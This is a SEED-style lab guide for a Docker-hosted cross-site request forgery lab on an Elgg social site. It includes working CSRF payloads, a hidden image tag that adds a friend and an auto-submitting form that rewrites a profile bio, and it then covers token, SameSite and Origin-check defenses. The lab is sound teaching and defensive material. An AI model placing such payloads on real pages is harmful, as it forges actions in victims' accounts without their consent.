# Lab 03 — Cross-Site Request Forgery (CSRF) Attack Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_CSRF_Elgg/
Textbook: Chapter 10 — Cross-Site Request Forgery (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#4-lab-03--cross-site-request-forgery-csrf)
CWE Reference: [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access Target site in host browsers via `http://localhost:10082` (or `http://www.seed-server.com:10082`) and Attacker site via `http://localhost:10083` (or `http://www.attacker32.com:10083`). Do not use internal container IPs `10.9.0.5` or `10.9.0.105` directly in host browsers.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it elgg-10.9.0.5-csrf sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

---

## 📖 The CSRF Story: Alice & Samy

### Act 1 — The Legitimate Session (Alice's Trust)
* **Alice** (`guid: 56`) visits the trusted social network **`http://www.seed-server.com`** and logs in (`alice` / `seedalice`).
* Upon successful authentication, the server sets a session cookie (`elggperm` / session ID) in Alice's browser.
* The browser automatically stores this cookie and will attach it to **every future HTTP request** sent to `www.seed-server.com`.

### Act 2 — The Malicious Bait (Samy's Trap)
* **Samy** (`guid: 59`, the attacker) builds a deceptive website hosted on a completely separate domain: **`http://www.attacker32.com:81`**.
* The page lures victims with a "Free Gift Card / Prize" theme.
* Hidden inside this malicious page are forged requests targeting Alice's account on `www.seed-server.com`.

### Act 3 — The Silent Exploitation
While Alice is still logged in to Elgg, she opens a new tab and visits Samy's malicious page:

1. **The GET Attack (Add Friend):**
   * The attacker page includes an invisible 1×1 tracker image:
     ```html
     <img src="http://www.seed-server.com/action/friends/add?friend=59" style="display:none;" />
     ```
   * The browser parses the `<img>` tag and fires a `GET` request to `www.seed-server.com`.
   * **The Vulnerability:** Because the destination is `www.seed-server.com`, the browser automatically includes Alice's ambient session cookies. The server cannot tell the difference between Alice clicking "Add Friend" and this silent background request.
   * **Result:** Samy is instantly added to Alice's friends list.

2. **The POST Attack (Profile Tampering):**
   * The attacker page contains a hidden HTML form that auto-submits via JavaScript:
     ```html
     <form id="csrf-form" action="http://www.seed-server.com/action/profile/edit" method="POST">
         <input type="hidden" name="name" value="Alice" />
         <input type="hidden" name="description" value="Hacked by CSRF from attacker32.com!" />
         <input type="hidden" name="guid" value="56" />
     </form>
     <script>document.getElementById('csrf-form').submit();</script>
     ```
   * **Result:** Alice's bio is overwritten without her permission.

```mermaid
sequenceDiagram
    autonumber
    actor Alice as 👩 Alice (Victim)
    participant Target as 🎯 www.seed-server.com (Elgg)
    participant Attacker as 💀 www.attacker32.com:81 (Attacker)
    participant DB as 🗄️ MySQL (elgg_seed)

    Alice->>Target: 1. Login (alice / seedalice)
    Target-->>Alice: Set-Cookie: session_id=abc123
    Note over Alice,Attacker: Alice keeps tab open & visits attacker site
    Alice->>Attacker: 2. Visit http://www.attacker32.com:81
    Attacker-->>Alice: 3. Return HTML with hidden forged GET/POST payloads
    Note over Alice,Target: Browser auto-attaches Alice's cookie to cross-site requests!
    Alice->>Target: 4. GET /action/friends/add?friend=59 (Cookie: abc123)
    Target->>DB: INSERT INTO elgg_entity_relationships (56, 'friend', 59)
    Alice->>Target: 5. POST /action/profile/edit (bio='Hacked!', Cookie: abc123)
    Target->>DB: UPDATE elgg_metadata SET value='Hacked!' WHERE entity_guid=56
    Target-->>Alice: 200 OK (Changes saved)
    Note over Alice,Target: Alice returns to Elgg -> Profile modified!
```

---

## 🗄️ Database Forensic Evidence: Before & After

Inspect the live MySQL container to observe the state change during the attack:

### 1. Baseline Check (Before Attack):
```powershell
# Check Alice's friends (should return 0 rows)
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE guid_one = 56;"

# Check Alice's profile bio
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE entity_guid = 56 AND name = 'description';"
```

### 2. Post-Attack Check (After Visiting Attacker Site):
```powershell
# Friend relationship table now contains Samy (59)
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE guid_one = 56;"

# Profile metadata bio now contains attacker's string
docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE entity_guid = 56 AND name = 'description';"
```

---

## 🛡️ The Resolution: How it is Fixed Step by Step

### Defense 1: Anti-CSRF Synchronizer Tokens (`__elgg_token` & `__elgg_ts`)
* **Mechanism:** When rendering a legitimate page, the server generates a cryptographically random, unguessable token tied to the user's session:
  ```html
  <input type="hidden" name="__elgg_token" value="WBFnQFiJ0Jb6VyZ84vWMnA" />
  <input type="hidden" name="__elgg_ts" value="1788794932" />
  ```
* **Why the Attack Fails:** Due to the **Same-Origin Policy (SOP)**, scripts running on `www.attacker32.com` cannot read the DOM of `www.seed-server.com`. The attacker cannot steal the token, so the forged request arrives without a valid `__elgg_token` and is rejected by the server (`403 Forbidden`).

### Defense 2: `SameSite` Cookie Attribute
* **Mechanism:** The server flags its authentication cookie with `SameSite=Strict` or `SameSite=Lax`:
  ```text
  Set-Cookie: elggperm=xyz789; SameSite=Strict; Path=/; HttpOnly
  ```
* **Why the Attack Fails:** The browser strictly blocks cookies flagged with `SameSite=Strict` from being sent on third-party cross-site requests originating from `www.attacker32.com`. The forged request arrives at `www.seed-server.com` as an unauthenticated request and fails.

### Defense 3: Origin / Referer Header Verification
* **Mechanism:** The server inspects the `Origin` or `Referer` HTTP request header on state-changing requests (`POST`/`PUT`/`DELETE`).
* **Why the Attack Fails:** When the request is sent from `www.attacker32.com`, the browser sets `Origin: http://www.attacker32.com`. If the server verifies that `Origin !== http://www.seed-server.com`, it immediately drops the request.

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 127.0.0.1 (or localhost:10082)
  | Hosts file: www.attacker32.com  -> 127.0.0.1 (or localhost:10083)
  |
  | Port 10082 -> elgg-10.9.0.5-csrf:80      (target site)
  | Port 10083 -> attacker-10.9.0.105:80     (attacker site)
  |
  Docker Bridge Network: net-10.9.0.0-csrf (10.9.0.0/24)
    |
    +---- elgg-10.9.0.5-csrf   (Apache + PHP + Elgg, www.seed-server.com)
    |         |
    +---- mysql-10.9.0.6-csrf  (MySQL 8.0 + elgg_csrf database)
    |
    +---- attacker-10.9.0.105  (Apache static, www.attacker32.com)
```

```mermaid
graph TB
    subgraph HOST["Host Machine (Windows) — Two different hostnames"]
        AliceBrowser["👩 Alice Browser\nTab 1: www.seed-server.com:10082\nTab 2: www.attacker32.com:10083"]
        Hosts["hosts file\n127.0.0.1  www.seed-server.com\n127.0.0.1  www.attacker32.com"]
    end

    subgraph DOCKER["Docker Bridge: net-10.9.0.0-csrf (10.9.0.0/24)"]
        ELGG["elgg-10.9.0.5-csrf\nApache + PHP + Elgg\nwww.seed-server.com"]
        MYSQL["mysql-10.9.0.6-csrf\nMySQL 8.0\nelgg_csrf DB"]
        ATK["attacker-10.9.0.105\nApache static HTML\nwww.attacker32.com"]
    end

    Hosts -. "resolves both" .-> AliceBrowser
    AliceBrowser -- "1. Login → gets cookie" --> ELGG
    AliceBrowser -- "2. Visits attacker page" --> ATK
    ATK -- "3. Hidden img/form fires cross-site request\n   (browser sends cookie automatically!)" --> ELGG
    ELGG -- "4. Processes forged request" --> MYSQL
```

---

## Layer 1 — Docker Commands (host terminal)

### Start the Lab

```bash
# Change into the CSRF lab directory (contains docker-compose.yml with 3 services)
cd labs/03-csrf

# Windows PowerShell: builds all 3 images and starts containers in detached mode
.\start.ps1

# Linux / WSL2 bash equivalent
./start.sh

# Manual equivalent
# This lab starts 3 containers: elgg (target site), mysql, attacker (malicious site)
docker compose up -d --build
```

### Verify Container Status

```bash
# List all 3 containers with their status and exposed ports
# elgg-10.9.0.5-csrf:80 -> host:10082 (target), attacker-10.9.0.105:80 -> host:10083 (attacker)
docker compose ps

# Inspect the Elgg target container — confirms IP 10.9.0.5 on the CSRF bridge network
docker inspect elgg-10.9.0.5-csrf

# Inspect the attacker container — confirms IP 10.9.0.105, separate Apache instance
docker inspect attacker-10.9.0.105
```

---

## Layer 2 — Linux Commands (inside the container)

### Open Bash Shell

```bash
# Open an interactive bash shell inside the Elgg target container
# Use this to inspect PHP source, edit config, or view logs
docker exec -it elgg-10.9.0.5-csrf bash
```

### Inspect Application Configuration

```bash
# Navigate to the Apache document root inside the container
cd /var/www/html

# Search for action parameters in index.php — these are the endpoints
# the CSRF attack forges (e.g., action=addfriend, action=update_profile)
# Understanding these endpoints tells you exactly what the forged request must contain
grep -n "action" index.php
```

### Exit Container

```bash
# Return from the container shell back to your host terminal
exit
```

---

## Layer 3 — Security Tasks

### Access Applications

```
Target Site:   http://localhost:10082  OR  http://www.seed-server.com:10082
Attacker Site: http://localhost:10083  OR  http://www.attacker32.com:10083
```

---

## Stop and Reset

```bash
docker compose down
docker compose down -v
```

---

## § Complete Demonstration Walkthrough

Follow these steps in order from a cold machine. Every command is shown in both **PowerShell** (Windows) and **raw Docker / bash** equivalents.

**Default lab credentials:**
| Username | Password  | Role     | Elgg GUID |
|----------|-----------|----------|-----------|
| admin    | seedadmin | Admin    | 1         |
| alice    | seedalice | Victim   | 56        |
| samy     | seedsamy  | Attacker | 59        |

> **This lab requires two browser sessions simultaneously** — one as Alice (victim logged into the target site) and one representing visiting the attacker site. Use a normal window for Alice and an Incognito/Private window for the attacker perspective, or use two different browsers.

---

### Step 0 — Verify Docker Desktop is Running

**PowerShell:**
```powershell
docker info | Select-String "Server Version"
```

**Raw Docker:**
```bash
docker info | grep "Server Version"
```

> **Expected:** `Server Version: 27.x.x`
> **If it fails:** Open Docker Desktop from the Start menu, wait ~30 seconds, then re-run.

---

### Step 1 — Navigate to the Lab and Start Containers

**PowerShell:**
```powershell
cd C:\path\to\seed-web-security-docker\labs\03-csrf
.\start.ps1
```

**Raw Docker Compose (equivalent):**
```bash
cd labs/03-csrf
docker compose up -d --build
```

> This lab starts **three** containers: the Elgg target site, MySQL, and the attacker web server.

---

### Step 2 — Verify All Three Containers Are Running

**PowerShell / Raw Docker:**
```bash
docker compose ps
```

**Expected output:**
```
NAME                    IMAGE                          STATUS    PORTS
elgg-10.9.0.5-csrf      seed-image-www-csrf-elgg       Up        0.0.0.0:10082->80/tcp
mysql-10.9.0.6-csrf     seed-image-mysql-csrf          Up        3306/tcp
attacker-10.9.0.105     seed-image-www-csrf-attacker   Up        0.0.0.0:10083->80/tcp
```

All three must show `Up`. If any shows `Exiting`:
```bash
docker compose logs elgg
docker compose logs mysql
docker compose logs attacker
```

**Inspect each container's IP:**
```bash
docker inspect elgg-10.9.0.5-csrf   | grep "IPAddress"
# Expected: "IPAddress": "10.9.0.5"

docker inspect attacker-10.9.0.105  | grep "IPAddress"
# Expected: "IPAddress": "10.9.0.105"
```

---

### Step 3 — Configure the Hosts File (One-Time Setup — Two Entries Required)

This lab requires **two** hostname entries: one for the legitimate target site and one for the attacker's site. Both must be distinct hostnames for the cross-origin attack to work correctly.

**PowerShell (run as Administrator):**
```powershell
Add-Content "C:\Windows\System32\drivers\etc\hosts" "127.0.0.1   www.seed-server.com"
Add-Content "C:\Windows\System32\drivers\etc\hosts" "127.0.0.1   www.attacker32.com"
```

**Verify both entries:**
```powershell
Get-Content "C:\Windows\System32\drivers\etc\hosts" | Select-String "seed-server|attacker32"
```

**Raw bash (Linux/WSL2):**
```bash
echo "127.0.0.1   www.seed-server.com" | sudo tee -a /etc/hosts
echo "127.0.0.1   www.attacker32.com"  | sudo tee -a /etc/hosts
```

> **Why two entries?** The browser enforces the Same-Origin Policy based on hostname. Both sites resolve to `127.0.0.1` on your machine but appear as different origins to the browser — exactly simulating the real-world cross-site attack scenario. Without separate hostnames, the attack would be same-origin and behave differently.
>
> **Skip hosts file?** Use `http://localhost:10082` for target and `http://localhost:10083` for attacker. Note that with `localhost` both share the same origin and the attack demonstration is less accurate.

---

### Step 4 — Open Browser Tab 1: Log In as Alice (Victim)

Open your browser (normal window) and navigate to:
```
http://www.seed-server.com:10082
```
or:
```
http://localhost:10082
```

**What you should see:** The Elgg social network login page.

1. Log in with: **Username:** `alice` / **Password:** `seedalice`
2. After login, verify Alice is logged in — her name appears in the top navigation bar.
3. **Leave this tab open and stay logged in.** Alice's session cookie is now stored in the browser.

---

### Step 5 — Open Browser Tab 2: Visit the Attacker Site

Open a **new browser tab** (same browser, same session) and navigate to:
```
http://www.attacker32.com:10083
```
or:
```
http://localhost:10083
```

**What you should see:** A page titled "Congratulations! You've Won a Free Gift!" with the text "Loading your free gift claim code..."

**What is happening invisibly:**
- The page contains a 1×1 pixel hidden `<img>` tag:
  ```html
  <img src="http://www.seed-server.com/index.php?action=addfriend&friend=59"
       width="1" height="1" style="display:none;">
  ```
- The moment the browser loads this page, it fires a `GET` request to `www.seed-server.com` to add Samy (GUID 59) as Alice's friend.
- Because Alice's session cookie is stored in the browser, the browser **automatically includes it** in the cross-site request.
- The Elgg server receives a fully authenticated-looking request and adds Samy as Alice's friend.

> **Inspect the attacker page source** to see the payload:
> ```
> view-source:http://www.attacker32.com:10083
> ```
> or open the attacker container's source file:
> ```bash
> docker exec -it attacker-10.9.0.105 cat /var/www/html/index.html
> ```

---

### Step 6 — Task 2: Verify the GET CSRF Attack Succeeded

Switch back to **Tab 1** (Alice's session on `www.seed-server.com`).

1. Click **Alice** → **Profile** in the navigation bar.
2. Click the **Friends** tab or section.

**Expected outcome:** Samy now appears in Alice's friends list — even though Alice never clicked "Add Friend". The forged cross-site GET request, sent automatically by the browser when Alice visited the attacker page, was silently accepted and processed by the server.

**Verify the friend relationship in MySQL:**
```bash
docker exec -it mysql-10.9.0.6-csrf mysql -u root -pseedubuntu elgg \
  -e "SELECT guid_one, guid_two FROM elgg_entity_relationships WHERE relationship='friend' AND guid_one=56;"
```
> `guid_one=56` is Alice. If GUID `59` (Samy) appears in `guid_two`, the attack succeeded.

---

### Step 7 — Task 3: CSRF POST Attack — Forge a Profile Update

The attacker page also contains a hidden `<form>` that auto-submits via JavaScript:

```html
<form id="csrf-post-form" action="http://www.seed-server.com/index.php" method="POST">
    <input type="hidden" name="action" value="update_profile">
    <input type="hidden" name="bio" value="Hacked by CSRF attack from www.attacker32.com!">
</form>
<script>
    document.getElementById('csrf-post-form').submit();
</script>
```

**To demonstrate the POST attack cleanly:**

1. First **reset Alice's profile** to a clean state (you can do this via Alice's Edit Profile page).
2. Revisit the attacker page: `http://www.attacker32.com:10083`
3. Switch back to Alice's profile page and **refresh**.

**Expected outcome:** Alice's bio/profile field now reads `"Hacked by CSRF attack from www.attacker32.com!"` — changed without Alice's knowledge or consent.

**Verify in MySQL:**
```bash
docker exec -it mysql-10.9.0.6-csrf mysql -u root -pseedubuntu elgg \
  -e "SELECT value FROM elgg_metadata WHERE name='description' AND entity_guid=56 LIMIT 1\G"
```

---

### Step 8 — Inspect Attacker Files Inside the Container

**Open a shell into the attacker container:**
```bash
docker exec -it attacker-10.9.0.105 bash
```

**Inspect the malicious page:**
```bash
cat /var/www/html/index.html
```

**Check the Apache virtual host config:**
```bash
cat /etc/apache2/sites-enabled/*.conf
```

**Exit:**
```bash
exit
```

---

### Step 9 — Defense Option A: SameSite Cookie Attribute

**Goal:** Configure the session cookie to be `SameSite=Strict` so the browser refuses to send it on cross-site requests.

**Enter the Elgg container:**
```bash
docker exec -it elgg-10.9.0.5-csrf bash
```

**Locate the session cookie configuration:**
```bash
grep -rn "setcookie\|session_start\|SameSite" /var/www/html/ | head -20
```

**Apply `SameSite=Strict`** to the session cookie call in the PHP configuration. Look for `session_set_cookie_params` or `setcookie` and add the `samesite` option:
```php
session_set_cookie_params([
    'samesite' => 'Strict',
    'secure'   => false,   // set true in production with HTTPS
    'httponly' => true,
]);
```

**Exit the container:**
```bash
exit
```

**Re-test:** Visit the attacker page again while logged in as Alice. The browser will no longer send Alice's cookie with the cross-site request — Samy will NOT be added as a friend.

---

### Step 10 — Defense Option B: Elgg's Built-In Secret Token (Anti-CSRF Token)

Elgg has a built-in anti-CSRF token mechanism (`__elgg_token` + `__elgg_ts`). You can observe it in legitimate requests:

1. Open browser DevTools (F12) → **Network** tab.
2. Click "Add Friend" or submit any Elgg form legitimately.
3. Inspect the POST body — you will see `__elgg_token=<hash>&__elgg_ts=<timestamp>`.

The attacker page cannot include a valid token because:
- The token is generated server-side per session.
- JavaScript on `www.attacker32.com` cannot read it from `www.seed-server.com` (blocked by Same-Origin Policy).

**To verify the token validation is active**, try sending a forged request without the token:
```bash
curl -s -b "Elgg=<paste Alice's session cookie here>" \
  "http://localhost:10082/action/friends/add?friend=59" | grep -i "token\|error\|invalid"
```
> **Expected:** An error response about a missing or invalid token. If Elgg's CSRF protection is enabled, the request is rejected.

---

### Step 11 — Teardown

**Stop containers (preserve database state):**

**PowerShell:**
```powershell
docker compose down
```

**Raw Docker:**
```bash
docker compose down
```

**Full reset (wipe all data):**
```bash
docker compose down -v
```

**Verify all CSRF lab containers are stopped:**
```bash
docker ps | grep csrf
# Expected: no output
```

